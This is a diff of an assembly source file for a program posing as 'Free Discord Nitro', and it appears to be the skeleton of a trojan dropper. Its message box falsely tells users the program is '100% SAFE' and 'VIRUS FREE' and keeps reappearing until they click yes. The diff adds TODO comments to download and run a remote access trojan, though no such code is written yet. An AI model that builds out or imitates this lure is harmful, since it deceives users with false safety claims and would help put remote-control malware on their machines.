@@ -26,7 +26,7 @@ MSGBOX_NO  equ 7h                                       ; message box no selecte
 unauth       db "STOP! You are not authorized to read this! ",
                 "Stop reading this immediately. OR ELSE!!!", 0
 
-msgBox1Title db "Free Discord Nitro 2024 v2.4 - Nephilim Edition", 0
+msgBox1Title db "Free Discord Nitro 2024 v2.7 - Nephilim Edition", 0
 msgBox1Text  db "IMPORTANT NOTICE: This program is 100% SAFE and verified ",
                 "by top security professionals to be VIRUS FREE.          ",
                 "                                                         ",
@@ -55,7 +55,9 @@ main proc
   cmp eax, MSGBOX_YES                                   ; check for yes selection
   jne display_msg                                       ; continually show messagebox until yes selected
 
+  ; TODO: download rat program
 
+  ; TODO: run rat program
 
   done:
   mov eax, 0                                            ; set status code
